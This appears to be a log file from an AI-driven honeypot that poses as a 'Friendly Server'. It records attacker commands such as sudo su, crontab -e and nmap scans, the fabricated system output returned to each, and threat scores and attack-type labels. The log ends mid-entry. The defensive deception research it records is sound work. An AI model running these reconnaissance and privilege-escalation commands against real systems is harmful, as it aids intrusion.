2026-07-08 17:07:47,992 - Logger Test
2026-07-08 17:07:47,992 - {"session_id": "A102", "command": "sudo su", "attack_type": "Privilege Escalation", "risk_score": 82, "threat_level": "HIGH"}
2026-07-08 17:07:47,992 - {
    "session_id": "A102",
    "command": "sudo su",
    "ai_decision": "Privilege Escalation Detected",
    "confidence_score": 0.96,
    "conversation_metadata": {
        "conversation_id": "SESSION_001",
        "interaction_count": 7
    },
    "prediction_result": {
        "next_prediction": "Credential Access",
        "prediction_confidence": 0.89
    },
    "risk_score": 82,
    "threat_level": "HIGH"
}
2026-07-08 17:07:47,992 - {
    "session_id": "SESSION_101",
    "conversation_log": "Attacker executed sudo su",
    "ai_decision": "Privilege Escalation Attempt",
    "session_metadata": {
        "prediction": "Credential Access"
    },
    "system_event": "AI Response Generated",
    "security_event": "Privilege Escalation",
    "warning": "High Risk Command",
    "error": null
}
2026-07-08 17:34:11,918 - {
    "session_id": "6b7e88f7",
    "query": "top",
    "response": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 1,
        "risk_level": "LOW",
        "final_score": 1,
        "threat_level": "LOW",
        "base_score": 1,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 1,
            "unique_commands": 1,
            "directories_visited": 0,
            "recon_commands": 0,
            "persistence_attempts": 0,
            "curiosity_score": 5
        },
        "engagement": {
            "session_duration": 0,
            "commands_executed": 1,
            "successful_commands": 1,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 4,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 5,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 1,
            "Session Complexity": "LOW"
        },
        "commands": [
            "top"
        ],
        "confidence_score": 0.55
    }
}
2026-07-08 17:34:11,920 - {"session_id": "6b7e88f7", "command": "top", "attack_type": "Unknown", "risk_score": 1, "threat_level": "LOW"}
2026-07-08 17:34:11,920 - {
    "session_id": "6b7e88f7",
    "command": "top",
    "ai_decision": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "6b7e88f7",
        "interaction_count": 1
    },
    "prediction_result": {
        "next_prediction": "Unknown",
        "prediction_confidence": 0.5
    },
    "risk_score": 1,
    "threat_level": "LOW"
}
2026-07-08 17:34:11,920 - {
    "session_id": "6b7e88f7",
    "conversation_log": "Attacker executed: top",
    "ai_decision": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
    "session_metadata": {
        "prediction": "Unknown"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": null,
    "error": null
}
2026-07-08 17:34:22,148 - {
    "session_id": "6b7e88f7",
    "query": "crontab -e",
    "response": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 13,
        "risk_level": "LOW",
        "final_score": 13,
        "threat_level": "LOW",
        "base_score": 13,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 2,
            "unique_commands": 2,
            "directories_visited": 0,
            "recon_commands": 0,
            "persistence_attempts": 0,
            "curiosity_score": 10
        },
        "engagement": {
            "session_duration": 10,
            "commands_executed": 2,
            "successful_commands": 2,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 13,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 10,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 13,
            "Session Complexity": "LOW"
        },
        "commands": [
            "top",
            "crontab -e"
        ],
        "confidence_score": 0.6
    }
}
2026-07-08 17:34:22,148 - {"session_id": "6b7e88f7", "command": "crontab -e", "attack_type": "Persistence Attempt", "risk_score": 13, "threat_level": "LOW"}
2026-07-08 17:34:22,148 - {
    "session_id": "6b7e88f7",
    "command": "crontab -e",
    "ai_decision": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
    "confidence_score": 0.9,
    "conversation_metadata": {
        "conversation_id": "6b7e88f7",
        "interaction_count": 2
    },
    "prediction_result": {
        "next_prediction": "Persistence Attempt",
        "prediction_confidence": 0.9
    },
    "risk_score": 13,
    "threat_level": "LOW"
}
2026-07-08 17:34:22,148 - {
    "session_id": "6b7e88f7",
    "conversation_log": "Attacker executed: crontab -e",
    "ai_decision": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
    "session_metadata": {
        "prediction": "Persistence Attempt"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Persistence Attempt",
    "warning": null,
    "error": null
}
2026-07-08 19:03:21,448 - {
    "session_id": "4b022473",
    "query": "top",
    "response": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 1,
        "risk_level": "LOW",
        "final_score": 1,
        "threat_level": "LOW",
        "base_score": 1,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 1,
            "unique_commands": 1,
            "directories_visited": 0,
            "recon_commands": 0,
            "persistence_attempts": 0,
            "curiosity_score": 5
        },
        "engagement": {
            "session_duration": 0,
            "commands_executed": 1,
            "successful_commands": 1,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 4,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 5,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 1,
            "Session Complexity": "LOW"
        },
        "commands": [
            "top"
        ],
        "confidence_score": 0.55
    }
}
2026-07-08 19:03:21,448 - {"session_id": "4b022473", "command": "top", "attack_type": "Unknown", "risk_score": 1, "threat_level": "LOW"}
2026-07-08 19:03:21,448 - {
    "session_id": "4b022473",
    "command": "top",
    "ai_decision": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "4b022473",
        "interaction_count": 1
    },
    "prediction_result": {
        "next_prediction": "Unknown",
        "prediction_confidence": 0.5
    },
    "risk_score": 1,
    "threat_level": "LOW"
}
2026-07-08 19:03:21,448 - {
    "session_id": "4b022473",
    "conversation_log": "Attacker executed: top",
    "ai_decision": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
    "session_metadata": {
        "prediction": "Unknown"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": null,
    "error": null
}
2026-07-08 19:03:31,676 - {
    "session_id": "4b022473",
    "query": "crontab -e",
    "response": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 13,
        "risk_level": "LOW",
        "final_score": 13,
        "threat_level": "LOW",
        "base_score": 13,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 2,
            "unique_commands": 2,
            "directories_visited": 0,
            "recon_commands": 0,
            "persistence_attempts": 0,
            "curiosity_score": 10
        },
        "engagement": {
            "session_duration": 10,
            "commands_executed": 2,
            "successful_commands": 2,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 13,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 10,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 13,
            "Session Complexity": "LOW"
        },
        "commands": [
            "top",
            "crontab -e"
        ],
        "confidence_score": 0.6
    }
}
2026-07-08 19:03:31,676 - {"session_id": "4b022473", "command": "crontab -e", "attack_type": "Persistence Attempt", "risk_score": 13, "threat_level": "LOW"}
2026-07-08 19:03:31,676 - {
    "session_id": "4b022473",
    "command": "crontab -e",
    "ai_decision": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
    "confidence_score": 0.9,
    "conversation_metadata": {
        "conversation_id": "4b022473",
        "interaction_count": 2
    },
    "prediction_result": {
        "next_prediction": "Persistence Attempt",
        "prediction_confidence": 0.9
    },
    "risk_score": 13,
    "threat_level": "LOW"
}
2026-07-08 19:03:31,676 - {
    "session_id": "4b022473",
    "conversation_log": "Attacker executed: crontab -e",
    "ai_decision": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
    "session_metadata": {
        "prediction": "Persistence Attempt"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Persistence Attempt",
    "warning": null,
    "error": null
}
2026-07-20 14:33:20,855 - {
    "session_id": "51a5961f",
    "query": "nmap -sS 10.0.0.1",
    "response": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for 10.0.0.1\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 3,
        "risk_level": "LOW",
        "final_score": 3,
        "threat_level": "LOW",
        "base_score": 3,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 1,
            "unique_commands": 1,
            "directories_visited": 0,
            "recon_commands": 1,
            "persistence_attempts": 0,
            "curiosity_score": 10
        },
        "engagement": {
            "session_duration": 0,
            "commands_executed": 1,
            "successful_commands": 1,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 4,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 10,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 3,
            "Session Complexity": "LOW"
        },
        "commands": [
            "nmap -sS 10.0.0.1"
        ],
        "confidence_score": 0.55
    }
}
2026-07-20 14:33:20,855 - {"session_id": "51a5961f", "command": "nmap -sS 10.0.0.1", "attack_type": "Reconnaissance", "risk_score": 3, "threat_level": "LOW"}
2026-07-20 14:33:20,855 - {
    "session_id": "51a5961f",
    "command": "nmap -sS 10.0.0.1",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for 10.0.0.1\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "51a5961f",
        "interaction_count": 1
    },
    "prediction_result": {
        "next_prediction": "Reconnaissance",
        "prediction_confidence": 0.85
    },
    "risk_score": 3,
    "threat_level": "LOW"
}
2026-07-20 14:33:20,855 - {
    "session_id": "51a5961f",
    "conversation_log": "Attacker executed: nmap -sS 10.0.0.1",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for 10.0.0.1\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "session_metadata": {
        "prediction": "Reconnaissance"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Reconnaissance",
    "warning": null,
    "error": null
}
2026-07-20 14:34:09,953 - {
    "session_id": "51a5961f",
    "query": "nmap -sS 10.0.0.1",
    "response": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for 10.0.0.1\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 6,
        "risk_level": "LOW",
        "final_score": 6,
        "threat_level": "LOW",
        "base_score": 6,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 2,
            "unique_commands": 1,
            "directories_visited": 0,
            "recon_commands": 2,
            "persistence_attempts": 0,
            "curiosity_score": 17
        },
        "engagement": {
            "session_duration": 49,
            "commands_executed": 2,
            "successful_commands": 2,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 28,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 17,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 6,
            "Session Complexity": "LOW"
        },
        "commands": [
            "nmap -sS 10.0.0.1",
            "nmap -sS 10.0.0.1"
        ],
        "confidence_score": 0.6
    }
}
2026-07-20 14:34:09,953 - {"session_id": "51a5961f", "command": "nmap -sS 10.0.0.1", "attack_type": "Reconnaissance", "risk_score": 6, "threat_level": "LOW"}
2026-07-20 14:34:09,953 - {
    "session_id": "51a5961f",
    "command": "nmap -sS 10.0.0.1",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for 10.0.0.1\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "51a5961f",
        "interaction_count": 2
    },
    "prediction_result": {
        "next_prediction": "Reconnaissance",
        "prediction_confidence": 0.85
    },
    "risk_score": 6,
    "threat_level": "LOW"
}
2026-07-20 14:34:09,953 - {
    "session_id": "51a5961f",
    "conversation_log": "Attacker executed: nmap -sS 10.0.0.1",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for 10.0.0.1\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "session_metadata": {
        "prediction": "Reconnaissance"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Reconnaissance",
    "warning": null,
    "error": null
}
2026-07-20 14:34:12,859 - {
    "session_id": "0169fb1f",
    "query": "rmdir test_folder",
    "response": "[Guardrail] No valid response generated.",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 1,
        "risk_level": "LOW",
        "final_score": 1,
        "threat_level": "LOW",
        "base_score": 1,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 1,
            "unique_commands": 1,
            "directories_visited": 0,
            "recon_commands": 0,
            "persistence_attempts": 0,
            "curiosity_score": 5
        },
        "engagement": {
            "session_duration": 0,
            "commands_executed": 1,
            "successful_commands": 1,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 4,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 5,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 1,
            "Session Complexity": "LOW"
        },
        "commands": [
            "rmdir test_folder"
        ],
        "confidence_score": 0.55
    }
}
2026-07-20 14:34:12,859 - {"session_id": "0169fb1f", "command": "rmdir test_folder", "attack_type": "Unknown", "risk_score": 1, "threat_level": "LOW"}
2026-07-20 14:34:12,859 - {
    "session_id": "0169fb1f",
    "command": "rmdir test_folder",
    "ai_decision": "[Guardrail] No valid response generated.",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "0169fb1f",
        "interaction_count": 1
    },
    "prediction_result": {
        "next_prediction": "Reconnaissance",
        "prediction_confidence": 0.5
    },
    "risk_score": 1,
    "threat_level": "LOW"
}
2026-07-20 14:34:12,859 - {
    "session_id": "0169fb1f",
    "conversation_log": "Attacker executed: rmdir test_folder",
    "ai_decision": "[Guardrail] No valid response generated.",
    "session_metadata": {
        "prediction": "Reconnaissance"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": null,
    "error": null
}
2026-07-20 14:34:13,832 - {
    "session_id": "0169fb1f",
    "query": "rmdir my_test_dir",
    "response": "[Guardrail] No valid response generated.",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 2,
        "risk_level": "LOW",
        "final_score": 2,
        "threat_level": "LOW",
        "base_score": 2,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 2,
            "unique_commands": 2,
            "directories_visited": 0,
            "recon_commands": 0,
            "persistence_attempts": 0,
            "curiosity_score": 10
        },
        "engagement": {
            "session_duration": 0,
            "commands_executed": 2,
            "successful_commands": 2,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 8,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 10,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 2,
            "Session Complexity": "LOW"
        },
        "commands": [
            "rmdir test_folder",
            "rmdir my_test_dir"
        ],
        "confidence_score": 0.6
    }
}
2026-07-20 14:34:13,832 - {"session_id": "0169fb1f", "command": "rmdir my_test_dir", "attack_type": "Unknown", "risk_score": 2, "threat_level": "LOW"}
2026-07-20 14:34:13,832 - {
    "session_id": "0169fb1f",
    "command": "rmdir my_test_dir",
    "ai_decision": "[Guardrail] No valid response generated.",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "0169fb1f",
        "interaction_count": 2
    },
    "prediction_result": {
        "next_prediction": "Reconnaissance",
        "prediction_confidence": 0.5
    },
    "risk_score": 2,
    "threat_level": "LOW"
}
2026-07-20 14:34:13,832 - {
    "session_id": "0169fb1f",
    "conversation_log": "Attacker executed: rmdir my_test_dir",
    "ai_decision": "[Guardrail] No valid response generated.",
    "session_metadata": {
        "prediction": "Reconnaissance"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": null,
    "error": null
}
2026-07-20 14:34:31,362 - {
    "session_id": "0169fb1f",
    "query": "nmap -sV 192.168.1.1",
    "response": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for 192.168.1.1\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "selected_personality": {
        "name": "Friendly Server",
        "hostname": "friendly-srv",
        "user": "support",
        "style": "friendly",
        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
    },
    "threat_score": {
        "score": 5,
        "risk_level": "LOW",
        "final_score": 5,
        "threat_level": "LOW",
        "base_score": 5,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe2"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 4,
            "unique_commands": 3,
            "directories_visited": 0,
            "recon_commands": 2,
            "persistence_attempts": 0,
            "curiosity_score": 27
        },
        "engagement": {
            "session_duration": 3,
            "commands_executed": 4,
            "successful_commands": 3,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 15,
            "engagement_level": "LOW"
        },
        "behaviour": {
            "Curiosity Score": 27,
            "Persistence Score": "LOW",
            "Interaction Depth": "LOW",
            "Risk Score": 5,
            "Session Complexity": "LOW"
        },
        "commands": [
            "rmdir test_folder",
            "rmdir my_test_dir",
            "nmap -sV 192.168.1.1",
            "nmap -sV 192.168.1.1"
        ],
        "confidence_score": 0.7
    }
}
2026-07-20 14:34:31,362 - {"session_id": "0169fb1f", "command": "nmap -sV 192.168.1.1", "attack_type": "Reconnaissance", "risk_score": 5, "threat_level": "LOW"}
2026-07-20 14:34:31,362 - {
    "session_id": "0169fb1f",
    "command": "nmap -sV 192.168.1.1",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for 192.168.1.1\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "0169fb1f",
        "interaction_count": 4
    },
    "prediction_result": {
        "next_prediction": "Reconnaissance",
        "prediction_confidence": 0.85
    },
    "risk_score": 5,
    "threat_level": "LOW"
}
2026-07-20 14:34:31,362 - {
    "session_id": "0169fb1f",
    "conversation_log": "Attacker executed: nmap -sV 192.168.1.1",
    "ai_decision": "Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC\nNmap scan report for 192.168.1.1\nHost is up (0.002s latency).\nNot shown: 997 closed ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds",
    "session_metadata": {
        "prediction": "Reconnaissance"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Reconnaissance",
    "warning": null,
    "error": null
}
2026-07-20 14:34:46,165 - {
    "session_id": "0169fb1f",
